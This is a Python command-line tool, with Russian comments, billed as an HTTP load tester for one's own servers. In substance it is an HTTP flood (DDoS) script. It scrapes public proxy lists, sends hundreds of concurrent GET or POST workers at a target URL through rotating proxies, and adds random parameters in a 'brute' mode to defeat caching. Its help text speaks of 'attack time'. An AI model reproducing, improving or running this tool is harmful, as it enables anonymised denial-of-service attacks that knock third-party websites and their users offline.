#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
⚡ HTTP Load Tester v1.2 — Termux / Linux / macOS / Windows
Тестирование СВОИХ серверов через прокси.
"""

import sys, os, platform
if sys.version_info < (3, 8):
    sys.stderr.write("✘ Требуется Python 3.8+. У тебя: %s\n" % sys.version)
    sys.exit(1)

# ─── Определяем Termux / окружение ───
IS_TERMUX = "com.termux" in os.environ.get("PREFIX", "") or \
            os.path.exists("/data/data/com.termux/files/usr")
IS_ANDROID = IS_TERMUX or "ANDROID_ROOT" in os.environ
IS_WINDOWS = platform.system() == "Windows"

# ─── Настраиваем пути Termux ───
def termux_path(*parts):
    if IS_TERMUX:
        return os.path.join(os.environ.get("HOME", "/data/data/com.termux/files/home"), *parts)
    return os.path.join(os.getcwd(), *parts)

import argparse
import asyncio
import json
import random
import string
import time
from collections import Counter
from pathlib import Path

# ─── Автоустановка зависимостей ───
def _ensure(pkg, import_name=None):
    import importlib
    name = import_name or pkg
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"  ⚙ Устанавливаю {pkg}...")
        import subprocess
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install",
                                   "-q", "--no-input", pkg])
        except subprocess.CalledProcessError:
            sys.stderr.write(
                f"✘ Не удалось установить {pkg}.\n"
                f"  Попробуй вручную: pip install {pkg}\n"
                f"  На Termux может понадобиться: pkg install python-dev clang libffi openssl\n"
            )
            sys.exit(1)
        return importlib.import_module(name)

aiohttp = _ensure("aiohttp")
aiohttp_socks = _ensure("aiohttp-socks", "aiohttp_socks")

# colorama опциональна — на Termux обычно ставится нормально
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    HAVE_COLOR = True
except ImportError:
    HAVE_COLOR = False
    class _Dummy:
        def __getattr__(self, _): return ""
    Fore = Style = _Dummy()

from aiohttp_socks import ProxyConnector, ProxyType


def C(x, c):
    if not HAVE_COLOR:
        return str(x)
    return f"{c}{x}{Style.RESET_ALL}"


# ═══════════════════════════════════════════════════════════
BANNER = r"""
   ______             __  ___    __                __
  / ____/________ ___ / /_/   |  / /_____  ____  ____/ /
 / / __/ ___/ __ `/ __/ /| | /| / / ___/ _ \/ __ \/ __/
/ /_/ / /  / /_/ / /_/ / | |/ |/ / /__/  __/ /_/ / /_
\____/_/   \__,_/\__/_/  |__/|__/\___/\___/\____/\__/

         ⚡  L o a d   T e s t e r   v1.2  ⚡
              (Termux / Android ready)
"""

HELP_TEXT = """
╔══════════════════════════════════════════════════════════════════╗
║  ⚡  HTTP Load Tester — Help                                      ║
╠══════════════════════════════════════════════════════════════════╣
║  -h/help   | showing this message                                ║
║  -url      | set target url                                      ║
║  -m/mode   | set program mode                                    ║
║  -data     | set post data path (only works on post mode)        ║
║            | (Example: -data data.json)                          ║
║  -cookies  | set cookies (Example: 'id:xxx;ua:xxx')              ║
║  -v        | set proxy type (4/5/http, default:5)                ║
║  -t        | set threads number (default:400 on Termux)          ║
║  -f        | set proxies file (default:proxy.txt)                ║
║  -b        | enable/disable brute mode                           ║
║            | Enable=1 Disable=0  (default:0)                     ║
║  -s        | set attack time(default:60)                         ║
║  -down     | download proxies                                    ║
║  -check    | check proxies                                       ║
╚══════════════════════════════════════════════════════════════════╝
"""

BUILTIN_PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
]


# ═══════════════════════════════════════════════════════════
def parse_args():
    default_threads = 400 if IS_ANDROID else 800
    p = argparse.ArgumentParser(add_help=False)
    p.add_argument("-h", "-help", "--help", action="store_true", dest="help")
    p.add_argument("-url", dest="url")
    p.add_argument("-m", "-mode", "--mode", dest="mode", default="GET")
    p.add_argument("-data", dest="data")
    p.add_argument("-cookies", dest="cookies", default="")
    p.add_argument("-v", dest="ptype", default="5")
    p.add_argument("-t", dest="threads", type=int, default=default_threads)
    p.add_argument("-f", dest="pfile", default="proxy.txt")
    p.add_argument("-b", dest="brute", type=int, default=0)
    p.add_argument("-s", dest="seconds", type=int, default=60)
    p.add_argument("-down", action="store_true")
    p.add_argument("-check", action="store_true")
    return p.parse_args()


def print_banner():
    print(C(BANNER, Fore.CYAN))
    if IS_TERMUX:
        print(C("  📱 Режим Termux активен", Fore.YELLOW))


def info(m): print(C(f"  ⚡ {m}", Fore.CYAN))
def good(m): print(C(f"  ✔ {m}", Fore.GREEN))
def warn(m): print(C(f"  ⚠ {m}", Fore.YELLOW))
def bad(m):  print(C(f"  ✘ {m}", Fore.RED))
def dim(m):  print(C(f"    {m}", Fore.LIGHTBLACK_EX))


# ═══════════════════════════════════════════════════════════
def load_proxies(path):
    p = Path(path)
    if not p.exists():
        return []
    return [l.strip() for l in p.read_text(encoding="utf-8").splitlines()
            if l.strip() and not l.startswith("#")]


def parse_proxy(s, ptype):
    user = pw = None
    if "@" in s:
        auth, s = s.rsplit("@", 1)
        if ":" in auth:
            user, pw = auth.split(":", 1)
    if ":" not in s:
        return None
    host, port = s.rsplit(":", 1)
    try:
        port = int(port)
    except ValueError:
        return None
    m = {"4": ProxyType.SOCKS4, "5": ProxyType.SOCKS5, "http": ProxyType.HTTP}
    if ptype not in m:
        return None
    return m[ptype], host, port, user, pw


async def download_proxies(path):
    info("Скачиваю прокси со встроенных источников...")
    seen = set()
    timeout = aiohttp.ClientTimeout(total=25)
    # На Android может быть медленный DNS — используем обычный клиент
    connector = aiohttp.TCPConnector(ttl_dns_cache=600, limit=20)
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as s:
        for url in BUILTIN_PROXY_SOURCES:
            try:
                async with s.get(url) as r:
                    if r.status != 200:
                        continue
                    text = await r.text()
                    added = 0
                    for line in text.splitlines():
                        line = line.strip()
                        if line and ":" in line and line not in seen:
                            seen.add(line)
                            added += 1
                    good(f"{url.split('/')[-1]:<20} → +{added}")
            except Exception as e:
                dim(f"skip: {e}")

    if seen:
        Path(path).write_text("\n".join(sorted(seen)), encoding="utf-8")
        good(f"Сохранено: {len(seen)} прокси → {path}")
    else:
        bad("Не удалось скачать ни одного прокси. Проверь интернет.")


def parse_cookies(s):
    jar = {}
    for part in s.split(";"):
        part = part.strip()
        if ":" in part:
            k, v = part.split(":", 1)
            jar[k.strip()] = v.strip()
    return jar


def rand_str(n=8):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def brute_url(base):
    sep = "&" if "?" in base else "?"
    return f"{base}{sep}{rand_str(6)}={rand_str(10)}"


def brute_post(base_body):
    if not isinstance(base_body, dict):
        base_body = {}
    body = dict(base_body)
    body[rand_str(5)] = rand_str(10)
    return body


# ═══════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.ok = 0
        self.fail = 0
        self.codes = Counter()
        self.bytes = 0
        self.lat = []
        self.start = time.time()

    def hit(self, code, n, dt):
        self.ok += 1
        self.codes[code] += 1
        self.bytes += n
        self.lat.append(dt)

    def miss(self):
        self.fail += 1

    def report(self, final=False):
        el = max(time.time() - self.start, 1e-6)
        total = self.ok + self.fail
        rps = total / el
        avg = (sum(self.lat) / len(self.lat) * 1000) if self.lat else 0
        mb = self.bytes / 1024 / 1024
        line = (f"\r  ⚡ RPS={rps:8.1f}  ok={self.ok:>8}  fail={self.fail:>8}  "
                f"avg={avg:6.1f}ms  {mb:7.2f}MB   ")
        sys.stdout.write(C(line, Fore.MAGENTA if not final else Fore.CYAN))
        sys.stdout.flush()
        if final:
            print()
            if self.codes:
                parts = "  ".join(f"{k}:{v}" for k, v in self.codes.most_common(8))
                print(C(f"  Статусы: {parts}", Fore.GREEN))


# ═══════════════════════════════════════════════════════════
async def worker(args, proxies, post_body, cookies, stats, stop_at):
    direct = (args.ptype == "none" or not proxies)
    shared_session = None

    if direct:
        # На Termux лимит соединений поменьше — иначе ресурсы кончаются
        limit = 100 if IS_ANDROID else 0
        shared_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=limit, ttl_dns_cache=300),
            timeout=aiohttp.ClientTimeout(total=15),
            cookies=cookies,
        )

    try:
        while time.time() < stop_at:
            session = shared_session
            close = False

            if not direct:
                pr = random.choice(proxies)
                parsed = parse_proxy(pr, args.ptype)
                if not parsed:
                    stats.miss()
                    continue
                ptype, host, port, user, pw = parsed
                try:
                    conn = ProxyConnector(proxy_type=ptype, host=host, port=port,
                                          username=user, password=pw, rdns=True)
                    session = aiohttp.ClientSession(
                        connector=conn,
                        timeout=aiohttp.ClientTimeout(total=15),
                        cookies=cookies,
                    )
                    close = True
                except Exception:
                    stats.miss()
                    continue

            url = brute_url(args.url) if args.brute else args.url
            body = brute_post(post_body) if (args.brute and args.mode == "POST") else post_body

            t0 = time.time()
            try:
                if args.mode == "POST":
                    async with session.post(url, json=body) as r:
                        data = await r.read()
                        stats.hit(r.status, len(data), time.time() - t0)
                else:
                    async with session.get(url) as r:
                        data = await r.read()
                        stats.hit(r.status, len(data), time.time() - t0)
            except Exception:
                stats.miss()
            finally:
                if close and session:
                    await session.close()
    finally:
        if shared_session:
            await shared_session.close()


# ═══════════════════════════════════════════════════════════
async def check_proxies(args, proxies):
    info(f"Проверяю {len(proxies)} прокси (может занять время)...")
    alive = []
    lock = asyncio.Lock()
    sem = asyncio.Semaphore(100)   # ограничиваем параллелизм — важно для Android

    async def one(pr):
        async with sem:
            parsed = parse_proxy(pr, args.ptype)
            if not parsed:
                return
            ptype, host, port, user, pw = parsed
            try:
                conn = ProxyConnector(proxy_type=ptype, host=host, port=port,
                                      username=user, password=pw, rdns=True)
                async with aiohttp.ClientSession(
                    connector=conn, timeout=aiohttp.ClientTimeout(total=10)
                ) as s:
                    async with s.get("https://api.ipify.org") as r:
                        if r.status == 200:
                            ip = (await r.text()).strip()
                            async with lock:
                                alive.append(pr)
                                good(f"{pr:<28} → {ip}")
            except Exception:
                pass

    await asyncio.gather(*(one(p) for p in proxies))
    Path("proxy_alive.txt").write_text("\n".join(alive), encoding="utf-8")
    good(f"Живых: {len(alive)} / {len(proxies)}  → proxy_alive.txt")


# ═══════════════════════════════════════════════════════════
async def main():
    args = parse_args()

    if args.help or len(sys.argv) == 1:
        print_banner()
        print(C(HELP_TEXT, Fore.LIGHTBLACK_EX))
        if IS_TERMUX:
            print(C("\n  📱 Termux-советы:", Fore.YELLOW))
            dim("ulimit -n 4096       # поднять лимит файловых дескрипторов")
            dim("termux-wake-lock     # не дать Android убить процесс")
            dim("tmux new -s stress   # запустить в фоне")
        return

    print_banner()

    if args.down:
        await download_proxies(args.pfile)
        return

    if not args.url:
        bad("Не указан -url. Используй -help.")
        return

    if args.ptype not in ("4", "5", "http", "none"):
        bad("Недопустимый тип прокси (-v): 4 / 5 / http / none")
        return

    if args.mode not in ("GET", "POST"):
        bad("Режим (-m) только GET или POST")
        return

    post_body = None
    if args.mode == "POST":
        if not args.data:
            bad("Для POST нужен -data data.json")
            return
        try:
            post_body = json.loads(Path(args.data).read_text(encoding="utf-8"))
        except Exception as e:
            bad(f"Не могу прочитать {args.data}: {e}")
            return

    cookies = parse_cookies(args.cookies)
    proxies = [] if args.ptype == "none" else load_proxies(args.pfile)

    if args.ptype != "none" and not proxies:
        warn(f"Файл '{args.pfile}' пуст или не найден. Работаю без прокси. Скачай через -down.")
        args.ptype = "none"

    if args.check:
        if not proxies:
            bad("Нечего проверять.")
            return
        await check_proxies(args, proxies)
        return

    # Предупреждение Termux
    if IS_ANDROID and args.threads > 500:
        warn(f"На Android {args.threads} воркеров — это много. "
             f"Рекомендую ≤ 400, иначе возможны зависания.")
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        if soft < args.threads + 100:
            warn(f"ulimit -n = {soft}, а воркеров {args.threads}. "
                 f"Выполни: ulimit -n {min(4096, hard)}")
    except Exception:
        pass

    print()
    info(f"Цель:         {args.url}")
    info(f"Метод:        {args.mode}")
    info(f"Потоков:      {args.threads}")
    info(f"Прокси:       {args.ptype} ({len(proxies)} шт.)")
    info(f"Brute:        {'ON' if args.brute else 'OFF'}")
    info(f"Длительность: {args.seconds} сек")
    info(f"Платформа:    {'Termux/Android' if IS_ANDROID else platform.system()}")
    print(C("  " + "═" * 62, Fore.LIGHTBLACK_EX))

    stats = Stats()
    stop_at = time.time() + args.seconds

    async def reporter():
        while time.time() < stop_at:
            await asyncio.sleep(1)
            stats.report()
        stats.report(final=True)

    tasks = [asyncio.create_task(worker(args, proxies, post_body, cookies, stats, stop_at))
             for _ in range(args.threads)]
    tasks.append(asyncio.create_task(reporter()))

    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except KeyboardInterrupt:
        print()
        warn("Прервано пользователем.")
        stats.report(final=True)


if __name__ == "__main__":
    # На Termux при большом количестве соединений нужен select, а не epoll+proactor
    if IS_WINDOWS:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass